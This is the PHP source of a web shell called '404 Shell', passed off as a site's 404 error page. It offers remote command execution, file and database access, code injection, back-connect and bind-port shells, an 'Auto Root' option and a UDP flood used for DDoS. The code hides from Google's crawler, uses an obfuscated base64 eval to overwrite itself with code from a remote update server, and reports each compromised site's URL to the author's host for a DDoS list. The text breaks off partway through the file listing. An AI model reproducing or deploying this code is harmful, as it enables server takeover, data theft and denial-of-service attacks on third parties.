<?php
$pass               = md5("pw");
$version            = 2.3;
$adaptiveerrorpage  = true; //Get Default 404 page and replicate it, but add a login text field in the center at the bottom
$checkforupdates    = true;
$helpsupportbooter  = true; //True adds the shell to my ddos scripts list, I can't log in providing you change the password above
$checkforupdatesurl = "http://www.kylem.in/404update.php";
$mtime     = explode(' ', microtime());
$starttime = $mtime[1] + $mtime[0];
?><?PHP
global $pass, $version, $adaptiveerrorpage, $checkforupdates, $helpsupportbooter, $checkforupdatesurl, $nowpath;
error_reporting(0); //Was 7
@set_magic_quotes_runtime(0);
ob_start();
define('SA_ROOT', str_replace('\\', '/', dirname('__FILE__')) . '/');
define('IS_WIN', stristr($_SERVER['SERVER_SOFTWARE'], 'microsoft')); //DIRECTORY_SEPARATOR == '\\');
define('IS_COM', class_exists('COM') ? 1 : 0);
define('IS_GPC', get_magic_quotes_gpc());
$dis_func = get_cfg_var('disable_functions');
define('IS_PHPINFO', (!eregi("phpinfo", $dis_func)) ? 1 : 0);
@set_time_limit(0);
if (strpos($_SERVER['HTTP_USER_AGENT'], 'Google') !== false) {
    header('HTTP/1.0 404 Not Found');
    exit;
}
extract($_POST);
$cforupurl = $checkforupdatesurl;
if ($action == 'checkupdates') {
    if ($force == "true") {
        $cuuff = $cforupurl . "?u=" . urlencode((!empty($_SERVER['HTTPS'])) ? "https://www." . str_replace("www.", "", $_SERVER['SERVER_NAME']) . $_SERVER['REQUEST_URI'] : "http://www." . str_replace("www.", "", $_SERVER['SERVER_NAME']) . $_SERVER['REQUEST_URI']);
    } else {
        $cuuff = $cforupurl . "?v=" . $version;
    }
    $res = file_get_contents($cuuff);
    if (!$res) {
        $res = get_data($cuuff);
    }
    if ($res != "") {
        $ourFileHandle = fopen(preg_replace('@\(.*\(.*$@', '', __FILE__), "w");
        eval(base64_decode("ZndyaXRlKCRvdXJGaWxlSGFuZGxlLHN0cl9yZXBsYWNlKCJDRlVMSU5FSEVSRSIsJyRjaGVja2ZvcnVwZGF0ZXMgICAgPSAnLnN0cmJvb2woJGNoZWNrZm9ydXBkYXRlcykuJzsnLHN0cl9yZXBsYWNlKCJIU0JMSU5FSEVSRSIsJyRoZWxwc3VwcG9ydGJvb3RlciAgPSAnLnN0cmJvb2woJGhlbHBzdXBwb3J0Ym9vdGVyKS4nOycsc3RyX3JlcGxhY2UoIkNGVVVMSU5FSEVSRSIsJyRjaGVja2ZvcnVwZGF0ZXN1cmwgPSAiJy4kY2hlY2tmb3J1cGRhdGVzdXJsLiciOycsc3RyX3JlcGxhY2UoIkFFUExJTkVIRVJFIiwnJGFkYXB0aXZlZXJyb3JwYWdlICA9ICcuc3RyYm9vbCgkYWRhcHRpdmVlcnJvcnBhZ2UpLic7JyxzdHJfcmVwbGFjZSgiUEFTU1dPUkRMSU5FSEVSRSIsJyRwYXNzICAgICAgICAgICAgICAgPSAiJy4kcGFzcy4nIjsnLGh0bWxfZW50aXR5X2RlY29kZSgkcmVzKSkpKSkpKTs=")); //make sure we keep our own password, don't worry it is just writing the new data but because it does a string replace it replaces itself so to avoid this we do this
        fclose($ourFileHandle);
    }
}
if (isset($_GET['host']) && isset($_GET['time'])) {
    $packets = 0;
    ignore_user_abort(TRUE);
    set_time_limit(0);
    $exec_time = $_GET['time'];
    $time      = time();
    $max_time  = $time + $exec_time;
    $host      = $_GET['host'];
    for ($i = 0; $i < 65000; $i++) {
        $out .= 'X';
    }
    while (1) {
        $packets++;
        if (time() > $max_time) {
            break;
        }
        $rand = "80";
        if (isset($_GET['port']) && $_GET['port'] != "") {
            $rand = $_GET['port'];
        }
        $fp = fsockopen('udp://' . $host, $rand, $errno, $errstr, 5);
        if ($fp) {
            fwrite($fp, $out);
            fclose($fp);
        }
    }
}
$cookiepre    = '';
$cookiedomain = '';
$cookiepath   = '/';
$cookielife   = 86400;
!$writabledb && $writabledb = 'php,cgi,pl,asp,inc,js,html,htm,jsp';
$charsetdb = array(
    '',
    'armscii8',
    'ascii',
    'big5',
    'binary',
    'cp1250',
    'cp1251',
    'cp1256',
    'cp1257',
    'cp850',
    'cp852',
    'cp866',
    'cp932',
    'dec8',
    'euc-jp',
    'euc-kr',
    'gb2312',
    'gbk',
    'geostd8',
    'greek',
    'hebrew',
    'hp8',
    'keybcs2',
    'koi8r',
    'koi8u',
    'latin1',
    'latin2',
    'latin5',
    'latin7',
    'macce',
    'macroman',
    'sjis',
    'swe7',
    'tis620',
    'ucs2',
    'ujis',
    'utf8'
);
if ($charset == 'utf8') {
    header("content-Type: text/html; charset=utf-8");
} elseif ($charset == 'big5') {
    header("content-Type: text/html; charset=big5");
} elseif ($charset == 'gbk') {
    header("content-Type: text/html; charset=gbk");
} elseif ($charset == 'latin1') {
    header("content-Type: text/html; charset=iso-8859-2");
} elseif ($charset == 'euc-kr') {
    header("content-Type: text/html; charset=euc-kr");
} elseif ($charset == 'euc-jp') {
    header("content-Type: text/html; charset=euc-jp");
}
$self      = $_SERVER['PHP_SELF'] ? $_SERVER['PHP_SELF'] : $_SERVER['SCRIPT_NAME'];
$timestamp = time();
if ($action == "logout") {
    scookie('loginpass', '', -86400 * 365);
    scookie('showupdate', '', -86400 * 365);
    @header('Location: ' . $self);
    exit;
}
if ($pass) {
    if ($action == 'login') {
        if ($pass == md5($password)) {
            scookie('loginpass', md5($password));
            @header('Location: ' . $self);
            exit;
        }
    }
    if ($_COOKIE['loginpass']) {
        if ($_COOKIE['loginpass'] != $pass) {
            loginpage($adaptiveerrorpage);
        }
    } else {
        loginpage($adaptiveerrorpage);
    }
}
$errmsg = '';
!$action && $action = 'file';
if ($action == 'phpinfo') {
    if (IS_PHPINFO) {
        phpinfo();
        exit;
    } else {
        $errmsg = 'phpinfo() function has non-permissible';
    }
}
if ($doing == 'downfile' && $thefile) {
    if (!@file_exists($thefile)) {
        $errmsg = 'The file you want Downloadable was nonexistent';
    } else {
        $fileinfo = pathinfo($thefile);
        header('Content-type: application/x-' . $fileinfo['extension']);
        header('Content-Disposition: attachment; filename=' . $fileinfo['basename']);
        header('Content-Length: ' . filesize($thefile));
        @readfile($thefile);
        exit;
    }
}
if ($doing == 'backupmysql' && !$saveasfile) {
    if (!$table) {
        $errmsg = 'Please choose the table';
    } else {
        $mysqllink = mydbconn($dbhost, $dbuser, $dbpass, $dbname, $charset, $dbport);
        $filename  = basename($dbname . '.sql');
        header('Content-type: application/unknown');
        header('Content-Disposition: attachment; filename=' . $filename);
        foreach ($table as $k => $v) {
            if ($v) {
                sqldumptable($v);
            }
        }
        mysql_close();
        exit;
    }
}
if ($doing == 'mysqldown') {
    if (!$dbname) {
        $errmsg = 'Please input dbname';
    } else {
        $mysqllink = mydbconn($dbhost, $dbuser, $dbpass, $dbname, $charset, $dbport);
        if (!file_exists($mysqldlfile)) {
            $errmsg = 'The file you want Downloadable was nonexistent';
        } else {
            $result = q("select load_file('$mysqldlfile');");
            if (!$result) {
                q("DROP TABLE IF EXISTS tmp_angel;");
                q("CREATE TABLE tmp_angel (content LONGBLOB NOT NULL);");
                q("LOAD DATA LOCAL INFILE '" . addslashes($mysqldlfile) . "' INTO TABLE tmp_angel FIELDS TERMINATED BY '__angel_{$timestamp}_eof__' ESCAPED BY '' LINES TERMINATED BY '__angel_{$timestamp}_eof__';");
                $result = q("select content from tmp_angel");
                q("DROP TABLE tmp_angel");
            }
            $row = @mysql_fetch_array($result);
            if (!$row) {
                $errmsg = 'Load file failed ' . mysql_error();
            } else {
                $fileinfo = pathinfo($mysqldlfile);
                header('Content-type: application/x-' . $fileinfo['extension']);
                header('Content-Disposition: attachment; filename=' . $fileinfo['basename']);
                header("Accept-Length: " . strlen($row[0]));
                echo $row[0];
                exit;
            }
        }
    }
}
;
echo '<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=gbk">
<title>404 Shell - Version ' . $version . '</title>
<style>
#containertop .rowtop {
  margin: 0;
  padding: 0;
}
#containertop br {
  clear: both;
}
#containertop .blocktop {
  float: left;
}
#containertop .blocksep {
  float: left;
  padding-left:5px;
  padding-right:5px;
}
input[type="button"], input[type="submit"] { 
		moz-border-radius: 5px;
    -webkit-border-radius: 5px;
    border-radius: 5px;
    border-color:#b0b0b0;
    background:#3d3d3d;
    color:#ffffff;
    font:12px Arial,Tahoma;
    height:22px;
}
body,td{font: 12px Arial,Tahoma;line-height: 16px;}
.input{font:12px Arial,Tahoma;background:#fff;border: 1px solid #666;padding:2px;height:22px;}
.area{font:12px \'Courier New\', Monospace;background:#fff;border: 1px solid #666;padding:2px;}
.bt {border-color:#b0b0b0;background:#3d3d3d;color:#ffffff;font:12px Arial,Tahoma;height:22px;}
a {color: #00f;text-decoration:underline;}
a:hover{color: #f00;text-decoration:none;}
.alt1 td{border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#f1f1f1;padding:5px 15px 5px 5px;}
.alt2 td{border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#f9f9f9;padding:5px 15px 5px 5px;}
.focus td{border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#ffffaa;padding:5px 15px 5px 5px;}
.head td{border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#e9e9e9;padding:5px 15px 5px 5px;font-weight:bold;}
.head td span{font-weight:normal;}
.infolist {padding:10px;margin:10px 0 20px 0;background:#F1F1F1;border:1px solid #ddd;}
form{margin:0;padding:0;}
h2{margin:0;padding:0;height:24px;line-height:24px;font-size:14px;color:#5B686F;}
ul.info li{margin:0;color:#444;line-height:24px;height:24px;}
u{text-decoration: none;color:#777;float:left;display:block;width:150px;margin-right:10px;}
.drives{padding:5px;}
.drives span {margin:auto 7px;}
</style>
<script type="text/javascript">
function CheckAll(form) {
	for(var i=0;i<form.elements.length;i++) {
		var e = form.elements[i];
		if (e.name != \'chkall\')
		e.checked = form.chkall.checked;
    }
}
function $(id) {
	return document.getElementById(id);
}
function createdir(){
	var newdirname;
	newdirname = prompt(\'Please input the directory name:\', \'\');
	if (!newdirname) return;
	$(\'createdir\').newdirname.value=newdirname;
	$(\'createdir\').submit();
}
function fileperm(pfile){
	var newperm;
	newperm = prompt(\'Current file:\'+pfile+\'\\nPlease input new attribute:\', \'\');
	if (!newperm) return;
	$(\'fileperm\').newperm.value=newperm;
	$(\'fileperm\').pfile.value=pfile;
	$(\'fileperm\').submit();
}
function copyfile(sname){
	var tofile;
	tofile = prompt(\'Original file:\'+sname+\'\\nPlease input object file (fullpath):\', \'\');
	if (!tofile) return;
	$(\'copyfile\').tofile.value=tofile;
	$(\'copyfile\').sname.value=sname;
	$(\'copyfile\').submit();
}
function rename(oldname){
	var newfilename;
	var oldfname = oldname.substring(oldname.lastIndexOf(\'/\')+1)
	newfilename = prompt(\'Former file name: \'+oldname+\'\\nPlease input new filename:\', oldfname);
	if (!newfilename) return;
	$(\'rename\').newfilename.value=newfilename;
	$(\'rename\').oldname.value=oldname;
	$(\'rename\').submit();
}
function dofile(doing,thefile,m){
	if (m && !confirm(m)) {
		return;
	}
	$(\'filelist\').doing.value=doing;
	if (thefile){
		$(\'filelist\').thefile.value=thefile;
	}
	$(\'filelist\').submit();
}
function createfile(nowpath){
	var filename;
	filename = prompt(\'Please input the file name:\', \'\');
	if (!filename) return;
	opfile(\'editfile\',nowpath + filename,nowpath);
}
function opfile(action,opfile,dir){
	$(\'fileopform\').action.value=action;
	$(\'fileopform\').opfile.value=opfile;
	$(\'fileopform\').dir.value=dir;
	$(\'fileopform\').submit();
}
function killproc(pid){
	$(\'killprocform\').action.value=\'process\';
	$(\'killprocform\').pid.value=pid;
	$(\'killprocform\').doing.value=\'killproc\';
	$(\'killprocform\').submit();
}
function killprocm(){
	$(\'proclist\').action.value=\'process\';
	$(\'proclist\').doing.value=\'killproc\';
	$(\'proclist\').submit();
}
function godir(dir,view_writable){
	if (view_writable) {
		$(\'godir\').view_writable.value=view_writable;
	}
	$(\'godir\').dir.value=dir;
	$(\'godir\').submit();
}
function getsize(getdir,dir){
	$(\'getsize\').getdir.value=getdir;
	$(\'getsize\').dir.value=dir;
	$(\'getsize\').submit();
}
function editrecord(action, base64, tablename){
	if (action == \'del\') {		
		if (!confirm(\'Is or isn\\\'t deletion record?\')) return;
	}
	$(\'recordlist\').doing.value=action;
	$(\'recordlist\').base64.value=base64;
	$(\'recordlist\').tablename.value=tablename;
	$(\'recordlist\').submit();
}
function moddbname(dbname) {
	if(!dbname) return;
	$(\'setdbname\').dbname.value=dbname;
	$(\'setdbname\').submit();
}
function settable(tablename,doing,page) {
	if(!tablename) return;
	if (doing) {
		$(\'settable\').doing.value=doing;
	}
	if (page) {
		$(\'settable\').page.value=page;
	}
	$(\'settable\').tablename.value=tablename;
	$(\'settable\').submit();
}
function sv(action,nowpath,p1,p2,p3,p4,p5) {
	if(action != undefined) $(\'opform\').action.value=action;
	if(nowpath != undefined) $(\'opform\').nowpath.value=nowpath;
	if(p1 != undefined) $(\'opform\').p1.value=p1;
	if(p2 != undefined) $(\'opform\').p2.value=p2;
	if(p3 != undefined) $(\'opform\').p3.value=p3;
	if(p4 != undefined) $(\'opform\').p4.value=p4;
	if(p5 != undefined) $(\'opform\').p4.value=p5;
}
function g(action,nowpath,p1,p2,p3,p4,p5) {
	if(!action) return;
	sv(action,nowpath,p1,p2,p3,p4,p5);
	$(\'opform\').submit();
}
</script>
</head>
<body style="margin:0;table-layout:fixed; word-break:break-all">
';
$version .= "&u=" . urlencode((!empty($_SERVER['HTTPS'])) ? "https://www." . str_replace("www.", "", $_SERVER['SERVER_NAME']) . $_SERVER['REQUEST_URI'] : "http://www." . str_replace("www.", "", $_SERVER['SERVER_NAME']) . $_SERVER['REQUEST_URI']);
formhead(array(
    'name' => 'opform'
));
makehide('action', $action);
makehide('nowpath', $nowpath);
makehide('p1', $p1);
makehide('p2', $p2);
makehide('p3', $p3);
makehide('p4', $p4);
makehide('p5', $p5);
formfoot();
if (!function_exists('posix_getegid')) {
    $user  = @get_current_user();
    $uid   = @getmyuid();
    $gid   = @getmygid();
    $group = "?";
} else {
    $uid   = @posix_getpwuid(@posix_geteuid());
    $gid   = @posix_getgrgid(@posix_getegid());
    $user  = $uid['name'];
    $uid   = $uid['uid'];
    $group = $gid['name'];
    $gid   = $gid['gid'];
}
;
echo '<table width="100%" border="0" cellpadding="0" cellspacing="0">
	<tr class="head">
		<td><span style="float:right;">';
echo @php_uname();
;
echo ' / User:';
echo $uid . ' ( ' . $user . ' ) / Group: ' . $gid . ' ( ' . $group . ' )';
;
echo '</span>';
echo $_SERVER['HTTP_HOST'];
;
echo ' (';
if (gethostbyname($_SERVER['SERVER_NAME']) == "127.0.0.1") {
    echo $_SERVER["SERVER_ADDR"];
} else {
    echo gethostbyname($_SERVER['SERVER_NAME']);
}
;
echo ')</td>
	</tr>
	<tr class="alt1">
		<td>
			<div id="containertop"><span style="float:right;">PHP ';
echo PHP_VERSION;
;
echo ' / Safe Mode:';
echo getcfg('safe_mode');
;
echo '</span>
			<div class="rowtop">
			<div class="blocktop"><a href="javascript:g(\'file\');">File Manager</a></div><div class="blocksep">|</div>';
			if (!IS_WIN){
			echo '<div class="blocktop"><a href="javascript:g(\'process\');">Process Manager</a></div><div class="blocksep">|</div>';
			}
			echo '<div class="blocktop"><a href="javascript:g(\'mysqladmin\');">MySQL Manager</a></div><div class="blocksep">|</div>
			<div class="blocktop"><a href="javascript:g(\'sqlfile\');">MySQL Upload & Download</a></div><div class="blocksep">|</div>
			<div class="blocktop"><a href="javascript:g(\'cinj\');">Code Injector</a></div><div class="blocksep">|</div>
			<div class="blocktop"><a href="javascript:g(\'cej\');">Code Ejector</a></div><div class="blocksep">|</div>
			<div class="blocktop"><a href="javascript:g(\'fuzz\');">Fuzz Server</a></div><div class="blocksep">|</div>
			<div class="blocktop"><a href="javascript:g(\'dos\');">DDoS</a></div><div class="blocksep">|</div>
			<div class="blocktop"><a href="javascript:g(\'shell\');">Execute Command</a></div><div class="blocksep">|</div>
			<div class="blocktop"><a href="javascript:g(\'phpenv\');">PHP Variable</a></div><div class="blocksep">|</div>
			<div class="blocktop"><a href="javascript:g(\'portscan\');">Port Scan</a></div><div class="blocksep">|</div>
			<div class="blocktop"><a href="javascript:g(\'stringtools\');">String Tools</a></div><div class="blocksep">|</div>
			<div class="blocktop"><a href="javascript:g(\'email\');">Email</a></div><div class="blocksep">|</div>
			<div class="blocktop"><a href="javascript:g(\'secinfo\');">Security Information</a></div><div class="blocksep">|</div>
			<div class="blocktop"><a href="javascript:g(\'aroot\');">Auto Root</a></div><div class="blocksep">|</div>
			<div class="blocktop"><a href="javascript:g(\'pob\');">PHP Obfuscator</a></div><div class="blocksep">|</div>
			<div class="blocktop"><a href="javascript:g(\'eval\');">Evaluate PHP Code</a></div><div class="blocksep">|</div>
			';
if (!IS_WIN) {
    ;
    echo '<div class="blocktop"><a href="javascript:g(\'backconnect\');">Back Connect</a></div><div class="blocksep">|</div>
    <div class="blocktop"><a href="javascript:g(\'bindport\');">Bind Port</a></div><div class="blocksep">|</div>';
}
;
echo '<div class="blocktop"><a href="javascript:g(\'settings\');">Shell Settings</a></div><div class="blocksep">|</div>
			<div class="blocktop"><a href="javascript:g(\'checkupdates\');">Check for Shell Update</a></div><div class="blocksep">|</div>
			<div class="blocktop"><a href="javascript:g(\'SelfRemove\');">Remove Self</a></div><div class="blocksep">|</div>
			<div class="blocktop"><a href="javascript:g(\'logout\');">Logout</a></div>
			</div></div></td>
	</tr>
</table>
<table width="100%" border="0" cellpadding="15" cellspacing="0"><tr><td>
';
$errmsg && m($errmsg);
if (!$dir) {
    $dir = $_SERVER["DOCUMENT_ROOT"] ? $_SERVER["DOCUMENT_ROOT"] : '.';
}
$nowpath = getPath(SA_ROOT, $dir);
if (substr($dir, -1) != '/') {
    $dir = $dir . '/';
}
if ($action == 'dismissupdate'){
  	scookie('showupdate','false');
  	if ($p1 == ''){
  		$p1 = 'file';
  	}
  	$action = $p1;
}elseif($action != "checkupdates"){
	if ($helpsupportbooter == true || $checkforupdates) {
    $versionextra = "&u=" . urlencode((!empty($_SERVER['HTTPS'])) ? "https://www." . str_replace("www.", "", $_SERVER['SERVER_NAME']) . $_SERVER['REQUEST_URI'] : "http://www." . str_replace("www.", "", $_SERVER['SERVER_NAME']) . $_SERVER['REQUEST_URI']);
    $res          = file_get_contents($cforupurl . "?v=" . $version . $versionextra);
    if (!$res) {
        $res = get_data($cforupurl . "?v=" . $version . $versionextra);
    }
    if ($res != "") {
    		if($_COOKIE['showupdate'] != "false"){
    				m('<span style="float:center;">Shell Update available! <a href="javascript:g(\'checkupdates\');">Update Now!</a></span>   <span style="float:right;"><a href="javascript:g(\'dismissupdate\',\''.$nowpath.'\',\''.$action.'\');">Dismiss</a></span>');
    		}
    }
	}
}
if ($action == 'file') {
    $dir_writeable = @is_writable($nowpath) ? 'Writable' : 'Non-writable';
    if ($newdirname) {
        $mkdirs = $nowpath . $newdirname;
        if (file_exists($mkdirs)) {
            m('Directory has already existed');
        } else {
            m('Directory created ' . (@mkdir($mkdirs, 0777) ? 'success' : 'failed'));
            @chmod($mkdirs, 0777);
        }
    } elseif ($doupfile) {
        m('File upload ' . (@copy($_FILES['uploadfile']['tmp_name'], $uploaddir . '/' . $_FILES['uploadfile']['name']) ? 'success' : 'failed'));
    } elseif ($editfilename && $filecontent) {
        $fp        = @fopen($editfilename, 'w');
        $writingit = @fwrite($fp, $filecontent);
        @fclose($fp);
        if (!$writingit) {
            $writingit = file_put_contents($editfilename, $filecontent);
        }
        $writeit = ($writingit ? 'success' : 'failed');
        m('Save file ' . $writeit);
    } elseif ($pfile && $newperm) {
        if (!file_exists($pfile)) {
            m('The original file does not exist');
        } else {
            $newperm = base_convert($newperm, 8, 10);
            m('Modify file attributes ' . (@chmod($pfile, $newperm) ? 'success' : 'failed'));
        }
    } elseif ($oldname && $newfilename) {
        $nname = $nowpath . $newfilename;
        if (file_exists($nname) || !file_exists($oldname)) {
            m($nname . ' has already existed or original file does not exist');
        } else {
            m(basename($oldname) . ' renamed ' . basename($nname) . (@rename($oldname, $nname) ? ' success' : ' failed'));
        }
    } elseif ($sname && $tofile) {
        if (file_exists($tofile) || !file_exists($sname)) {
            m('The goal file has already existed or original file does not exist');
        } else {
            m(basename($tofile) . ' copied ' . (@copy($sname, $tofile) ? basename($tofile) . 'success' : 'failed'));
        }
    } elseif ($curfile && $tarfile) {
        if (!@file_exists($curfile) || !@file_exists($tarfile)) {
            m('The goal file has already existed or original file does not exist');
        } else {
            $time = @filemtime($tarfile);
            m('Modify file the last modified ' . (@touch($curfile, $time, $time) ? 'success' : 'failed'));
        }
    } elseif ($curfile && $year && $month && $day && $hour && $minute && $second) {
        if (!@file_exists($curfile)) {
            m(basename($curfile) . ' does not exist');
        } else {
            $time = strtotime("$year-$month-$day $hour:$minute:$second");
            m('Modify file the last modified ' . (@touch($curfile, $time, $time) ? 'success' : 'failed'));
        }
    } elseif ($doing == 'delfiles') {
        if ($dl) {
            $dfiles = '';
            $succ   = $fail = 0;
            foreach ($dl as $filepath) {
                if (is_dir($filepath)) {
                    if (@deltree($filepath)) {
                        $succ++;
                    } else {
                        $fail++;
                    }
                } else {
                    if (@unlink($filepath)) {
                        $succ++;
                    } else {
                        $fail++;
                    }
                }
            }
            m('Delete file/folders has completed. The results are Total: ' . count($dl) . ', Success: ' . $succ . ', Fail: ' . $fail);
        } else {
            m('Please select folder/file(s)');
        }
    }
    formhead(array(
        'name' => 'createdir'
    ));
    makehide('newdirname');
    makehide('dir', $nowpath);
    formfoot();
    formhead(array(
        'name' => 'fileperm'
    ));
    makehide('newperm');
    makehide('pfile');
    makehide('dir', $nowpath);
    formfoot();
    formhead(array(
        'name' => 'copyfile'
    ));
    makehide('sname');
    makehide('tofile');
    makehide('dir', $nowpath);
    formfoot();
    formhead(array(
        'name' => 'rename'
    ));
    makehide('oldname');
    makehide('newfilename');
    makehide('dir', $nowpath);
    formfoot();
    formhead(array(
        'name' => 'fileopform'
    ));
    makehide('action');
    makehide('opfile');
    makehide('dir');
    formfoot();
    formhead(array(
        'name' => 'getsize'
    ));
    makehide('getdir');
    makehide('dir');
    formfoot();
    $free = @disk_free_space($nowpath);
    !$free && $free = 0;
    $all = @disk_total_space($nowpath);
    !$all && $all = 0;
    $used = $all - $free;
    p('<h2>File Manager - Current disk free ' . sizecount($free) . ' of ' . sizecount($all) . ' (' . @round(100 / ($all / $free), 2) . '%)</h2>');
    $cwd_links = '';
    $path      = explode('/', $nowpath);
    $n         = count($path);
    for ($i = 0; $i < $n - 1; $i++) {
        $cwd_links .= '<a href="javascript:godir(\'';
        for ($j = 0; $j <= $i; $j++) {
            $cwd_links .= str_replace("'", "\'", $path[$j]) . '/';
        }
        $cwd_links .= '\');">' . $path[$i] . '/</a>';
    }
    ;
    echo '<script type="text/javascript">
document.onclick = shownav;
function shownav(e){
	var src = e?e.target:event.srcElement;
	do{
		if(src.id =="jumpto") {
			$(\'inputnav\').style.display = "";
			$(\'pathnav\').style.display = "none";
			//hidenav();
			return;
		}
		if(src.id =="inputnav") {
			return;
		}
		src = src.parentNode;
	}while(src.parentNode)

	$(\'inputnav\').style.display = "none";
	$(\'pathnav\').style.display = "";
}
</script>
<div style="background:#eee;margin-bottom:10px;">
	<table id="pathnav" width="100%" border="0" cellpadding="5" cellspacing="0">
		<tr>
			<td width="100%">';
    echo $cwd_links . ' - ' . getChmod($nowpath) . ' / ' . getPerms($nowpath) . getUser($nowpath);
    ;
    echo ' (';
    echo $dir_writeable;
    ;
    echo ')</td>
			<td nowrap><input class="bt" id="jumpto" name="jumpto" value="Jump to" type="button"></td>
		</tr>
	</table>
	<table id="inputnav" width="100%" border="0" cellpadding="5" cellspacing="0" style="display:none;">
	<form action="" method="post" id="godir" name="godir">
		<tr>
			<td nowrap>Current Directory (';
    echo $dir_writeable;
    ;
    echo ', ';
    echo getChmod($nowpath);
    ;
    echo ')</td>
			<td width="100%"><input name="view_writable" value="0" type="hidden" /><input onmouseover="this.focus();" class="input" name="dir" value="';
    echo $nowpath;
    ;
    echo '" type="text" style="width:99%;margin:0 8px;"></td>
			<td nowrap><input class="bt" value="GO" type="submit"></td>
		</tr>
	</form>
	</table>
';
    if (IS_WIN && IS_COM) {
        $obj = new COM('scripting.filesystemobject');
        if ($obj && is_object($obj) && $obj->Drives) {
            echo '<div class="drives">';
            $DriveTypeDB = array(
                0 => 'Unknow',
                1 => 'Removable',
                2 => 'Fixed',
                3 => 'Network',
                4 => 'CDRom',
                5 => 'RAM Disk'
            );
            $comma       = '';
            foreach ($obj->Drives as $drive) {
                if ($drive->Path) {
                    p($comma . '<a href="javascript:godir(\'' . str_replace("'", "\'", $drive->Path) . '/\');">' . $DriveTypeDB[$drive->DriveType] . '(' . $drive->Path . ')</a>');
                    $comma = '<span>|</span>';
                }
            }
            echo '</div>';
        }
    }
    ;
    echo '</div>
';
    $findstr = $_POST['findstr'];
    $re      = $_POST['re'];
    tbhead();
    p('<tr class="alt1"><td colspan="7" style="padding:5px;line-height:20px;">');
    p('<form action="' . $self . '" method="POST" enctype="multipart/form-data"><div style="float:right;"><input class="input" name="uploadfile" value="" type="file" /> <input class="bt" name="doupfile" value="Upload" type="submit" /><input name="uploaddir" value="' . $nowpath . '" type="hidden" /><input name="dir" value="' . $nowpath . '" type="hidden" /></div></form>');
    p('<a href="javascript:godir(\'' . str_replace("'", "\'", $_SERVER["DOCUMENT_ROOT"]) . '\');">WebRoot</a>');
    p(' | <a href="javascript:godir(\'' . str_replace("'", "\'", getcwd()) . '\');">ScriptPath</a>');
    p(' | <a href="javascript:godir(\'' . str_replace("'", "\'", $nowpath) . '\');">View All</a>');
    p(' | View Writable ( <a href="javascript:godir(\'' . str_replace("'", "\'", $nowpath) . '\',\'dir\');">Directory</a>');
    p(' | <a href="javascript:godir(\'' . str_replace("'", "\'", $nowpath) . '\',\'file\');">File</a> )');
    p(' | <a href="javascript:createdir();">Create Directory</a> | <a href="javascript:createfile(\'' . str_replace("'", "\'", $nowpath) . '\');">Create File</a>');
    p('<div style="padding:5px 0;"><form action="' . $self . '" method="POST">Find string in files(current folder): <input onmouseover="this.focus();" class="input" name="findstr" value="' . $findstr . '" type="text" /> <input class="bt" value="Find" type="submit" /> Type: <input onmouseover="this.focus();" class="input" name="writabledb" value="' . $writabledb . '" type="text" /><input name="dir" value="' . $dir . '" type="hidden" /> <input name="re" value="1" type="checkbox" ' . ($re ? 'checked' : '') . ' /> Regular expressions</form></div></td></tr>');
    p('<tr class="head"><td></td><td>File Name</td><td width="16%">Last modified</td><td width="10%">Size</td><td width="20%">Chmod / Perms</td><td width="22%">Action</td></tr>');
    $dirdata  = array();
    $filedata = array();
    if ($view_writable == 'dir') {
        $dirdata  = GetWDirList($nowpath);
        $filedata = array();
    } elseif ($view_writable == 'file') {
        $dirdata  = array();
        $filedata = GetWFileList($nowpath);
    } elseif ($findstr) {
        $dirdata  = array();
        $filedata = GetSFileList($nowpath, $findstr, $re);
    } else {
        $dirs = @opendir($dir);
        while ($file = @readdir($dirs)) {
            $filepath = $nowpath . $file;
            if (@is_dir($filepath)) {
                $dirdb['filename']    = $file;
                $dirdb['mtime']       = @date('Y-m-d H:i:s', filemtime($filepath));
                $dirdb['dirchmod']    = getChmod($filepath);
                $dirdb['dirperm']     = getPerms($filepath);
                $dirdb['fileowner']   = getUser($filepath);
                $dirdb['dirlink']     = $nowpath;
                $dirdb['server_link'] = $filepath;
                $dirdata[]            = $dirdb;
            } else {
                $filedb['filename']    = $file;
                $filedb['size']        = sizecount(@filesize($filepath));
                $filedb['mtime']       = @date('Y-m-d H:i:s', filemtime($filepath));
                $filedb['filechmod']   = getChmod($filepath);
                $filedb['fileperm']    = getPerms($filepath);
                $filedb['fileowner']   = getUser($filepath);
                $filedb['dirlink']     = $nowpath;
                $filedb['server_link'] = $filepath;
                $filedata[]            = $filedb;
            }
        }
        unset($dirdb);
        unset($filedb);
        @closedir($dirs);
    }
    @sort($dirdata);
    @sort($filedata);
    $dir_i = '0';
    p('<form id="filelist" name="filelist" action="' . $self . '" method="post">');
    makehide('action', 'file');
    makehide('thefile');
    makehide('doing');
    makehide('dir', $nowpath);
    foreach ($dirdata as $key => $dirdb) {
        if ($dirdb['filename'] != '..' && $dirdb['filename'] != '.') {
            if ($getdir && $getdir == $dirdb['server_link']) {
                $attachsize = dirsize($dirdb['server_link']);
                $attachsize = is_numeric($attachsize) ? sizecount($attachsize) : 'Unknown';
            } else {
                $attachsize = '<a href="javascript:getsize(\'' . str_replace("'", "\'", $dirdb['server_link']) . '\',\'' . $dir . '\');">Stat</a>';
            }
            $thisbg = bg();
            p('<tr class="' . $thisbg . '" onmouseover="this.className=\'focus\';" onmouseout="this.className=\'' . $thisbg . '\';">');
            p('<td width="2%" nowrap><input name="dl[]" type="checkbox" value="' . $dirdb['server_link'] . '"></td>');
            p('<td><a href="javascript:godir(\'' . str_replace("'", "\'", $dirdb['server_link']) . '\');">' . $dirdb['filename'] . '</a></td>');
            p('<td nowrap><a href="javascript:opfile(\'newtime\',\'' . $dirdb['server_link'] . '\',\'' . $dirdb['dirlink'] . '\');">' . $dirdb['mtime'] . '</a></td>');
            p('<td nowrap>' . $attachsize . '</td>');
            p('<td nowrap>');
            p('<a href="javascript:fileperm(\'' . str_replace("'", "\'", $dirdb['server_link']) . '\');">' . $dirdb['dirchmod'] . '</a> / ');
            p('<a href="javascript:fileperm(\'' . str_replace("'", "\'", $dirdb['server_link']) . '\');">' . $dirdb['dirperm'] . '</a>' . $dirdb['fileowner'] . '</td>');
            p('<td nowrap><a href="javascript:rename(\'' . str_replace("'", "\'", $dirdb['server_link']) . '\');">Rename</a></td>');
            p('</tr>');
            $dir_i++;
        } else {
            if ($dirdb['filename'] == '..') {
